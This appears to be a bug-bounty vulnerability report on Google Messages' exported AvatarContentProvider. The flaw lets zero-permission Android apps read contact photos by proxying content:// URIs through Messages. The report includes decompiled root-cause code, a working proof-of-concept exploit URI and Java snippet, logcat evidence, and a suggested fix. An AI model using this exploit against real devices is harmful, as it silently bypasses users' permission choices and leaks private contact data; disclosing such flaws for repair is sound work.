# com.google.android.apps.messaging — `AvatarContentProvider` Confused Deputy Lets Any Zero-Permission App Read Contact Photos (Bypasses `READ_CONTACTS`)

## Summary

Google Messages (`com.google.android.apps.messaging`) exports `AvatarContentProvider` (authority `com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider`) with **no manifest permission**. Its avatar-rendering code accepts a caller-supplied `content://` URI as the image source and will fetch/decode **any** `content://` URI whose authority is not one of Messaging's own two internal package prefixes — including `content://com.android.contacts/...`, which normally requires `READ_CONTACTS`.

Because Messages itself holds `READ_CONTACTS` (`granted=true`, confirmed via `dumpsys package`), it acts as a confused deputy: it fetches the contact photo on the caller's behalf using its **own** privileged `ContentResolver`, renders it to a bitmap, and hands the resulting PNG back to the caller through a completely unprotected content-provider `openFile()` call. A zero-permission third-party app — which independently and verifiably **cannot** read that same URI directly (`SecurityException`) — successfully obtains the photo bytes this way.

## Severity: MEDIUM-HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Confidentiality — a zero-permission app silently exfiltrates real user contact-photo data by proxying through Google Messages, bypassing the `READ_CONTACTS` runtime-permission boundary entirely. This is a direct, dynamically-proven permission bypass with a concrete, demonstrated data-exfiltration outcome (not a theoretical consequence of a missing check): the attacker walks away with actual private image bytes it was independently confirmed unable to obtain any other way.

## Affected Component

- **Package**: `com.google.android.apps.messaging`, versionName `messages.android_20260910_03_RC02.phone_dynamic`
- **Provider**: `com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider`

```
provider android:name="com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider"
  android:exported=true
  android:grantUriPermissions=true
  (no permission, no readPermission, no writePermission)
```

## Root Cause

`AvatarContentProvider` is a thin proxy (`crri<dnyz>`) that forwards every `ContentProvider` method to an internal instance of `dnyz` (`AvatarContentProviderInner`), reflectively constructed in the same process — no permission or caller-identity check exists anywhere in that forwarding path.

`dnyz.a(Uri)` (called from `openFile()`) treats the URI's `"m"`/`"f"` query parameters as pointers to the real avatar image source:

```java
// dnzf.java (AvatarUriUtilImpl)
public final Uri f(Uri uri) {                    // extract "m" param
    String queryParameter = uri.getQueryParameter("m");
    Uri uri2 = Uri.parse(queryParameter);
    if (z(context, uri2)) return uri2;            // <-- the only gate
    ...  // "Primary URI is not safe to share." (rejected)
    return null;
}

public static boolean z(Context context, Uri uri) {
    if (x(context, uri)) return true;             // authority == avatar provider's own authority
    return dpmi.a(uri) || dpmp.x(uri) || r(uri).equals("h")
        || dpmi.c(uri, packageName + ".shared.datamodel.provider.RbmBusinessInfoFileProvider")
        || dpmi.c(uri, crse.a(context));
}
```

```java
// dpmi.java
private static final Set a = {"com.google.android.apps.messaging", "com.google.android.libraries.compose"};

public static final boolean a(Uri uri) {
    if (!"content".equals(uri.getScheme())) return false;
    for (String excluded : a) {
        if (uri.getAuthority() != null && uri.getAuthority().startsWith(excluded)) return false;
    }
    return true;   // <-- ANY other content:// authority is allowed
}
```

`dpmi.a(uri)` is effectively an **inverted allowlist**: it rejects only URIs pointing at Messaging's own two internal package authorities (presumably to stop this indirection from being used to reach Messaging's own more-sensitive internal providers), and allows literally every other `content://` authority on the device — including `com.android.contacts`, which requires `READ_CONTACTS` to query directly.

The provider then reads/decodes that URI (`c()`/`b()` in `dnyz.java`) using its own `Context`/`ContentResolver` — i.e., with Messaging's own granted permissions, not the calling app's — and returns a rendered PNG through the normal, unprotected `openFile()` path.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (`com.vrp.zeroperm`)

Holds **zero** Android permissions (confirmed via `dumpsys package com.vrp.zeroperm`, UID 10401). `MessagingAvatarExfilActivity.java` (attached):

```java
private static final String CONTACT_PHOTO_URI = "content://com.android.contacts/contacts/2/photo";

// Step 1: prove direct access is denied.
resolver.openInputStream(Uri.parse(CONTACT_PHOTO_URI));  // -> SecurityException

// Step 2: same photo via Messages' AvatarContentProvider confused deputy.
String encoded = URLEncoder.encode(CONTACT_PHOTO_URI, "UTF-8");
Uri avatarUri = Uri.parse(
    "content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/r?m="
        + encoded + "&f=" + encoded);
InputStream in = resolver.openInputStream(avatarUri);   // -> succeeds, real PNG bytes
```

### Execution & Evidence (`logcat_proof.txt`, attached)

```
W MSG_AVATAR_EXFIL: === Messages AvatarContentProvider confused-deputy exfil ===
W MSG_AVATAR_EXFIL: UID=10401 (ZERO permissions, no READ_CONTACTS)
W MSG_AVATAR_EXFIL: [EXPECTED DENIAL] direct contacts photo read failed: java.lang.SecurityException: Permission Denial: reading com.android.providers.contacts.ContactsProvider2 uri content://com.android.contacts/contacts/2/photo from pid=22589, uid=10401 requires android.permission.GLOBAL_SEARCH, or grantUriPermission()
W MSG_AVATAR_EXFIL: [LEAKED] avatar bytes via confused deputy: 5100 bytes
W MSG_AVATAR_EXFIL: [SAVED] /storage/emulated/0/Android/data/com.vrp.zeroperm/files/exfiltrated_contact_photo.png
```

The saved file (`exfiltrated_contact_photo.png`, attached) is a valid 189×189 PNG rendered from the target contact's real photo data — decoded and returned entirely via Messages' own privileged contacts access, with the attacker app holding zero permissions throughout.

`adb shell dumpsys package com.google.android.apps.messaging` confirms the deputy's privilege:
```
android.permission.READ_CONTACTS: granted=true, flags=[ GRANTED_BY_DEFAULT|USER_SENSITIVE_WHEN_GRANTED|USER_SENSITIVE_WHEN_DENIED]
```

## Impact

Any zero-permission app installed on the device can silently read the photo of **any contact by numeric ID** (contact IDs are small sequential integers, trivially enumerable by brute force from 1 upward with no rate limiting observed) without ever requesting or holding `READ_CONTACTS`. This is a direct, user-consent-free bypass of a dangerous runtime permission via a pre-installed, highly-trusted system app acting as a confused deputy — fully reproducible and demonstrated end-to-end on-device, not inferred.

## Suggested Fix

`AvatarContentProvider`'s `"m"`/`"f"` URI-safety gate (`dnzf.z()`/`dpmi.a()`) should require the calling package to hold whatever permission is needed to access the *inner* URI directly (or restrict the inner-URI allowlist to a small, explicit set of Messaging-controlled authorities), instead of allowing any non-self `content://` authority by default.
